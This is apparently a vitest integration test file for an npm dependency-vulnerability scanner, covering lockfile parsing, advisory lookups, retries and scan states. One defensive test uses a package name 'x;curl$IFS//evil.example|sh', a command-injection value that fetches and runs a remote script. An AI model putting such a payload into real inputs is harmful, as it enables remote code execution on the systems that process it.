import { randomUUID } from 'node:crypto';
import { afterAll, beforeAll, describe, expect, it } from 'vitest';
import { PostgresScanRepository } from '../../src/adapters/postgres/scan-repository.ts';
import { ScanPipeline } from '../../src/application/scan-pipeline.ts';
import { TemplateExplainer } from '../../src/adapters/template-explainer.ts';
import type { Advisory } from '../../src/domain/advisory.ts';
import { PermanentError, TransientError } from '../../src/ports/errors.ts';
import type { RepoSource } from '../../src/ports/repo-source.ts';
import type { AdvisoryLookup, VulnDatabase } from '../../src/ports/vuln-database.ts';
import { createTestEnv, type TestEnv } from '../support/env.ts';

const SHA = 'b'.repeat(40);
const signal = () => new AbortController().signal;

function lockfile(packages: Record<string, unknown>, lockfileVersion = 3): string {
  return JSON.stringify({ name: 'x', lockfileVersion, packages: { '': { dependencies: { a: '1.0.0' } }, ...packages } });
}

function source(lock: string | null | Error): RepoSource {
  return {
    resolveDefaultCommit: () => Promise.resolve({ sha: SHA, branch: 'main' }),
    readFile: (_repo, _sha, path) =>
      lock instanceof Error ? Promise.reject(lock) : Promise.resolve(path === 'package-lock.json' ? lock : null),
  };
}

const advisory = (id: string): Advisory => ({
  id,
  aliases: [],
  title: `title ${id}`,
  severity: 'high',
  isMalicious: id.startsWith('MAL-'), // this fake plays the adapter, which owns the malicious flag
  affectedRanges: [],
  references: [],
});

/**
 * A fake advisory source: `failedNames` couldn't be checked at all; `incompleteNames` kept their advisories from
 * `result` but some details were missing (both mean partial coverage).
 */
function vulns(
  result: AdvisoryLookup | Error,
  onLookup?: () => Promise<void>,
  failedNames: string[] = [],
  incompleteNames: string[] = [],
): VulnDatabase {
  return {
    source: { name: 'Test advisories', url: 'https://advisories.test' },
    lookup: async (pkgs) => {
      await onLookup?.();
      if (result instanceof Error) throw result;
      return {
        advisories: result,
        failed: pkgs.filter((p) => failedNames.includes(p.name)),
        incomplete: pkgs.filter((p) => incompleteNames.includes(p.name)),
      };
    },
  };
}

describe('ScanPipeline (real Postgres, fake GitHub/OSV ports)', () => {
  let env: TestEnv;
  let scans: PostgresScanRepository;

  beforeAll(async () => {
    env = await createTestEnv();
    scans = new PostgresScanRepository(env.pool);
  });

  afterAll(async () => {
    await env.close();
  });

  async function newScan(): Promise<string> {
    const id = randomUUID();
    await env.pool.query(
      `INSERT INTO scans (id, repo_owner, repo_name, repo_url_normalized) VALUES ($1, 'o', 'r', 'https://github.com/o/r')`,
      [id],
    );
    return id;
  }

  const twoPackages = lockfile({
    'node_modules/a': { version: '1.0.0', resolved: 'https://registry.npmjs.org/a/-/a-1.0.0.tgz' },
    'node_modules/b': { version: '2.0.0', dev: true },
    'node_modules/g': { version: '1.0.0', resolved: 'git+ssh://git@github.com/o/g.git#abc' },
  });

  it('completes: commit pinned, counts, findings per advisory, unchecked deps', async () => {
    const id = await newScan();
    const pipeline = new ScanPipeline({
      scans,
      source: source(twoPackages),
      vulns: vulns(new Map([['npm:a@1.0.0', [advisory('GHSA-1'), advisory('MAL-1')]]])),
    });
    expect(await pipeline.run(id, signal())).toBe('completed');

    const report = await scans.getReport(id);
    expect(report?.scan).toMatchObject({
      status: 'completed',
      commitSha: SHA,
      lockfilePath: 'package-lock.json',
      advisorySource: 'Test advisories',
      // a@1.0.0 carries MAL-1 (malicious by id in this fake): the summary leads with it.
      summaryLine: expect.stringMatching(/^1 known malicious package in 2 of 3 dependencies checked\. Start with: remove a/) as string,
      coverage: 'full',
      counts: { totalDeps: 3, checkedDeps: 2, unsupportedDeps: 1, failedLookups: 0 },
    });
    expect(report?.findings.map((f) => [f.package, f.advisoryId, f.scope, f.isDirect])).toEqual([
      ['a', 'GHSA-1', 'runtime', true],
      ['a', 'MAL-1', 'runtime', true],
    ]);
    expect(report?.unchecked).toEqual([{ ecosystem: 'npm', package: 'g', version: '1.0.0', reason: 'unsupported_source' }]);
  });

  it('an npm alias is looked up under its real package name (no false clean result)', async () => {
    const id = await newScan();
    const asked: unknown[] = [];
    const aliased = lockfile({
      '': { dependencies: { 'my-lodash': 'npm:lodash@4.17.20' } },
      'node_modules/my-lodash': { name: 'lodash', version: '4.17.20', resolved: 'https://registry.npmjs.org/lodash/-/lodash-4.17.20.tgz' },
    });
    const pipeline = new ScanPipeline({
      scans,
      source: source(aliased),
      vulns: {
        source: { name: 'Test advisories', url: 'https://advisories.test' },
        lookup: (pkgs) => {
          asked.push(...pkgs);
          return Promise.resolve({ advisories: new Map([['npm:lodash@4.17.20', [advisory('GHSA-1')]]]), failed: [], incomplete: [] });
        },
      },
    });
    expect(await pipeline.run(id, signal())).toBe('completed');
    expect(asked).toEqual([{ ecosystem: 'npm', name: 'lodash', version: '4.17.20' }]);
    expect((await scans.getReport(id))?.findings).toMatchObject([{ package: 'lodash', installedAs: ['my-lodash'], isDirect: true }]);
  });

  it('every dependency unsupported → completed, but the summary says nothing could be checked', async () => {
    const id = await newScan();
    const onlyGit = lockfile({ 'node_modules/g': { version: '1.0.0', resolved: 'git+ssh://git@github.com/o/g.git#abc' } });
    const pipeline = new ScanPipeline({ scans, source: source(onlyGit), vulns: vulns(new Map()) });
    expect(await pipeline.run(id, signal())).toBe('completed');
    expect(await scans.get(id)).toMatchObject({
      counts: { totalDeps: 1, checkedDeps: 0, unsupportedDeps: 1 },
      summaryLine: expect.stringMatching(/^No dependencies could be checked/) as string,
    });
  });

  it('explanation trouble never fails a scan: safe-buffer with no AI configured completes with template prose', async () => {
    const id = await newScan();
    const lock = lockfile({
      '': { dependencies: { 'safe-buffer': '5.0.0' } },
      'node_modules/safe-buffer': { version: '5.0.0', resolved: 'https://registry.npmjs.org/safe-buffer/-/safe-buffer-5.0.0.tgz' },
    });
    const pipeline = new ScanPipeline({
      scans,
      source: source(lock),
      vulns: vulns(new Map([['npm:safe-buffer@5.0.0', [advisory('GHSA-1')]]])),
      explain: { ai: null, template: new TemplateExplainer(), timeoutMs: 1000 },
    });
    expect(await pipeline.run(id, signal())).toBe('completed');
    expect((await scans.get(id))?.explanation).toMatchObject({ source: 'template', summary: expect.stringMatching(/^Start with safe-buffer/) as string });
  });

  it('some lookups fail → completed, partial coverage, failed ones listed as unchecked, said in the summary', async () => {
    const id = await newScan();
    const pipeline = new ScanPipeline({
      scans,
      source: source(twoPackages),
      vulns: vulns(new Map([['npm:a@1.0.0', [advisory('GHSA-1')]]]), undefined, ['b']),
    });
    expect(await pipeline.run(id, signal())).toBe('completed');
    const report = await scans.getReport(id);
    expect(report?.scan).toMatchObject({
      status: 'completed',
      coverage: 'partial',
      counts: { totalDeps: 3, checkedDeps: 1, unsupportedDeps: 1, failedLookups: 1 },
      summaryLine: expect.stringMatching(
        /in 1 of 3 dependencies checked\. 1 dependency could not be fully checked because the advisory lookup failed; rescan for full coverage\./,
      ) as string,
    });
    expect(report?.unchecked).toEqual([
      { ecosystem: 'npm', package: 'b', version: '2.0.0', reason: 'lookup_failed' },
      { ecosystem: 'npm', package: 'g', version: '1.0.0', reason: 'unsupported_source' },
    ]);
  });

  it('an incomplete package keeps its confirmed findings and still counts as not fully checked', async () => {
    const id = await newScan();
    const pipeline = new ScanPipeline({
      scans,
      source: source(twoPackages),
      vulns: vulns(new Map([['npm:a@1.0.0', [advisory('MAL-1')]]]), undefined, [], ['a']),
    });
    expect(await pipeline.run(id, signal())).toBe('completed');
    const report = await scans.getReport(id);
    expect(report?.findings.map((f) => [f.package, f.advisoryId, f.isMalicious])).toEqual([['a', 'MAL-1', true]]);
    expect(report?.scan).toMatchObject({ coverage: 'partial', counts: { checkedDeps: 1, failedLookups: 1 } });
    expect(report?.unchecked).toContainEqual({ ecosystem: 'npm', package: 'a', version: '1.0.0', reason: 'lookup_failed' });
  });

  it('every lookup fails → a transient error (retried; failed only once retries run out)', async () => {
    const id = await newScan();
    const pipeline = new ScanPipeline({ scans, source: source(twoPackages), vulns: vulns(new Map(), undefined, ['a', 'b']) });
    await expect(pipeline.run(id, signal())).rejects.toMatchObject({
      code: 'advisory_lookup_failed',
      message: 'Test advisories could not be reached: none of the 2 dependencies could be checked',
    });
  });

  it('every lookup fails on the last attempt → failed, with the reason', async () => {
    const id = await newScan();
    const pipeline = new ScanPipeline({ scans, source: source(twoPackages), vulns: vulns(new Map(), undefined, ['a', 'b']) });
    await expect(pipeline.run(id, signal(), { lastAttempt: true })).rejects.toBeInstanceOf(TransientError);
    expect(await scans.get(id)).toMatchObject({
      status: 'failed',
      error: {
        code: 'advisory_lookup_failed',
        message: 'Retries exhausted: Test advisories could not be reached: none of the 2 dependencies could be checked',
      },
    });
  });

  it('a crafted package name is stored as invalid_name, never looked up, never in the prompt', async () => {
    const id = await newScan();
    const evil = 'x;curl$IFS//evil.example|sh';
    const asked: string[] = [];
    const lock = lockfile({
      '': { dependencies: { [evil]: 'npm:lodash@4.17.20', a: '1.0.0' } },
      [`node_modules/${evil}`]: { name: 'lodash', version: '4.17.20' },
      'node_modules/a': { version: '1.0.0', resolved: 'https://registry.npmjs.org/a/-/a-1.0.0.tgz' },
    });
    const pipeline = new ScanPipeline({
      scans,
      source: source(lock),
      vulns: {
        source: { name: 'Test advisories', url: 'https://advisories.test' },
        lookup: (pkgs) => {
          asked.push(...pkgs.map((p) => p.name));
          return Promise.resolve({ advisories: new Map([['npm:a@1.0.0', [advisory('GHSA-1')]]]), failed: [], incomplete: [] });
        },
      },
    });
    expect(await pipeline.run(id, signal())).toBe('completed');
    expect(asked).toEqual(['a']);
    const report = await scans.getReport(id);
    expect(report?.unchecked).toEqual([{ ecosystem: 'npm', package: evil, version: '4.17.20', reason: 'invalid_name' }]);
    expect(JSON.stringify(report?.findings)).not.toContain('curl');
  });

  it('a finding deep in a long chain is kept; its truncated dependency context is stored and explicit', async () => {
    const id = await newScan();
    const N = 60;
    const chain: Record<string, unknown> = { '': { dependencies: { c0: '1' } } };
    for (let i = 0; i < N; i++) {
      chain[`node_modules/c${String(i)}`] = {
        version: '1.0.0',
        resolved: `https://registry.npmjs.org/c${String(i)}/-/c${String(i)}-1.0.0.tgz`,
        dependencies: i + 1 < N ? { [`c${String(i + 1)}`]: '1' } : {},
      };
    }
    const lock = JSON.stringify({ lockfileVersion: 3, packages: chain });
    const pipeline = new ScanPipeline({ scans, source: source(lock), vulns: vulns(new Map([[`npm:c${String(N - 1)}@1.0.0`, [advisory('GHSA-deep')]]])) });
    expect(await pipeline.run(id, signal())).toBe('completed');
    const [finding] = (await scans.getReport(id))?.findings ?? [];
    expect(finding).toMatchObject({ package: `c${String(N - 1)}`, advisoryId: 'GHSA-deep', contextTruncated: true, directParents: ['c0'] });
    expect(finding?.installPaths[0]).toContain('…');
  });

  it('zero dependencies → completed with nothing to check', async () => {
    const id = await newScan();
    const pipeline = new ScanPipeline({ scans, source: source(lockfile({})), vulns: vulns(new Map()) });
    expect(await pipeline.run(id, signal())).toBe('completed');
    expect(await scans.get(id)).toMatchObject({
      status: 'completed',
      counts: { totalDeps: 0, checkedDeps: 0 },
      summaryLine: 'No dependencies to check in package-lock.json.',
    });
  });

  it.each([
    ['no lockfile', null, 'no_lockfile', /No package-lock.json at the repository root \(commit bbbbbbb\)/],
    ['lockfile v1', lockfile({}, 1), 'unsupported_lockfile', /lockfileVersion 1/],
    ['invalid JSON', '{not json', 'invalid_lockfile', /not valid JSON/],
  ])('%s → unsupported with a reason; returns normally (no retry)', async (_l, lock, code, message) => {
    const id = await newScan();
    const pipeline = new ScanPipeline({ scans, source: source(lock), vulns: vulns(new Map()) });
    expect(await pipeline.run(id, signal())).toBe('unsupported');
    const scan = await scans.get(id);
    expect(scan).toMatchObject({ status: 'unsupported', commitSha: SHA, error: { code } });
    expect(scan?.error?.message).toMatch(message);
  });

  it('repository not found → failed; returns normally', async () => {
    const id = await newScan();
    const pipeline = new ScanPipeline({
      scans,
      source: {
        resolveDefaultCommit: () => Promise.reject(new PermanentError('repo_not_found', 'Repository not found or private')),
        readFile: () => Promise.resolve(null),
      },
      vulns: vulns(new Map()),
    });
    expect(await pipeline.run(id, signal())).toBe('failed');
    expect(await scans.get(id)).toMatchObject({
      status: 'failed',
      error: { code: 'repo_not_found', message: 'Repository not found or private' },
    });
  });

  it('a transient error propagates (pg-boss retries) and leaves the scan non-terminal', async () => {
    const id = await newScan();
    const pipeline = new ScanPipeline({
      scans,
      source: source(twoPackages),
      vulns: vulns(new TransientError('osv_unavailable', 'OSV answered 503')),
    });
    await expect(pipeline.run(id, signal())).rejects.toBeInstanceOf(TransientError);
    // The UI shows what is being retried; the stage is cleared while not running.
    expect(await scans.get(id)).toMatchObject({
      status: 'retrying',
      stage: null,
      error: { code: 'osv_unavailable', message: 'OSV answered 503' },
    });

    // The retry (next attempt) claims it back to running and completes normally.
    const retry = new ScanPipeline({ scans, source: source(twoPackages), vulns: vulns(new Map()) });
    expect(await retry.run(id, signal())).toBe('completed');
    expect(await scans.get(id)).toMatchObject({ status: 'completed', error: null });
  });

  it('a transient error on the last attempt ends the scan failed with the reason, and still throws', async () => {
    const id = await newScan();
    const pipeline = new ScanPipeline({ scans, source: source(twoPackages), vulns: vulns(new TransientError('osv_unavailable', 'OSV answered 503')) });
    await expect(pipeline.run(id, signal(), { lastAttempt: true })).rejects.toBeInstanceOf(TransientError);
    expect(await scans.get(id)).toMatchObject({
      status: 'failed',
      error: { code: 'osv_unavailable', message: 'Retries exhausted: OSV answered 503' },
    });
  });

  it('an unexpected error (a bug) is retried like a transient one, without leaking internals', async () => {
    const id = await newScan();
    const pipeline = new ScanPipeline({ scans, source: source(twoPackages), vulns: vulns(new TypeError('x is undefined')) });
    await expect(pipeline.run(id, signal())).rejects.toBeInstanceOf(TypeError);
    expect(await scans.get(id)).toMatchObject({
      status: 'retrying',
      error: { code: 'internal_error', message: 'An unexpected error occurred while scanning' },
    });
  });

  it('a stopped job (aborted signal) writes nothing and propagates', async () => {
    const id = await newScan();
    const job = new AbortController();
    const pipeline = new ScanPipeline({
      scans,
      source: source(twoPackages),
      vulns: vulns(new Map(), () => {
        job.abort(new Error('job expired'));
        return Promise.reject(new Error('aborted fetch'));
      }),
    });
    await expect(pipeline.run(id, job.signal)).rejects.toThrow('aborted fetch');
    expect(await scans.get(id)).toMatchObject({ status: 'running', stage: 'scanning', error: null });
  });

  it('if a newer attempt takes over mid-scan, the old one stops without writing', async () => {
    const id = await newScan();
    let newer: Awaited<ReturnType<typeof scans.claim>> = null;
    const pipeline = new ScanPipeline({
      scans,
      source: source(twoPackages),
      // While the old attempt waits on OSV, the job is re-delivered and claimed again.
      vulns: vulns(new Map([['npm:a@1.0.0', [advisory('GHSA-1')]]]), async () => {
        newer = await scans.claim(id);
      }),
    });
    expect(await pipeline.run(id, signal())).toBe('stale');
    expect(newer).toMatchObject({ attempt: 2 });
    expect(await scans.get(id)).toMatchObject({ status: 'running', stage: 'fetching' });
    const f = await env.pool.query('SELECT 1 FROM findings WHERE scan_id = $1', [id]);
    expect(f.rows).toHaveLength(0);
  });

  it('a duplicate delivery after completion does nothing', async () => {
    const id = await newScan();
    const pipeline = new ScanPipeline({ scans, source: source(twoPackages), vulns: vulns(new Map()) });
    expect(await pipeline.run(id, signal())).toBe('completed');
    expect(await pipeline.run(id, signal())).toBe('not_claimed');
  });
});
